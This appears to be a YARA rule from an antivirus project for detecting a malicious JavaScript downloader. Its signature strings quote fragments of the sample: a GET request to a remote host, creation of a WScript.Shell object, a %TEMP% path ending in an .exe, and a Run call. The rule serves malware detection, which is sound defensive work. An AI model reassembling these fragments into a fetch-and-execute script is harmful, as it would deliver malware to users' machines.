rule sig_20160330_8364c02ba794fb405315fdf30365cfde {
  meta:
    description = "datamaliciousorder - file 20160330_8364c02ba794fb405315fdf30365cfde.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "eaa3373f590dc7209ba264e208368121b8e4dfacd13c0d75d9551fc313faf594"

  strings:
    $s1  = "_PV[_Z0](\"GET\", \"http://pro.monbento.com/n3iska\", false);" fullword ascii
    $s2  = "function _SE(_SZ, _L0){_K = _K * 1; return _SZ - _L0;};" fullword ascii
    $s3  = "var _UN = function _MD() {return WScript[_T](\"WScript\"+\".Shell\");}(), _V = 11;" fullword ascii
    $s4  = "if (_PV[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _Q() {return _UN[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"2YhfxYTMc.ex\" + \"e\";};" fullword ascii
    $s6  = "function _ON(){return _NX + \"\";};" fullword ascii
    $s7  = "function _U() {return ((_EY == true) && (_EY == _M)) ? 1 : _K;};" fullword ascii
    $s8  = "function _I(_J){_UN[\"Run\"](_J, _K, _K);};" fullword ascii
    $s9  = "function _Z()" fullword ascii
    $s10 = "return _SE(_D, _SE0);" fullword ascii
    $s11 = " while (_S0){" fullword ascii
    $s12 = "function _ML(){return 22;};" fullword ascii
    $s13 = "var _NG = new this[\"Date\"]();" fullword ascii
    $s14 = "function _PP(){return _T;};" fullword ascii
    $s15 = "function _MY(_G) {var _L = (1, 2, 3, 4, 5, _G); return _L;};" fullword ascii
    $s16 = "_M = true; " fullword ascii
    $s17 = "var _M = false;" fullword ascii
    $s18 = "var _EY = false;" fullword ascii
    $s19 = "var _TZ = false;" fullword ascii
    $s20 = "_EY = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}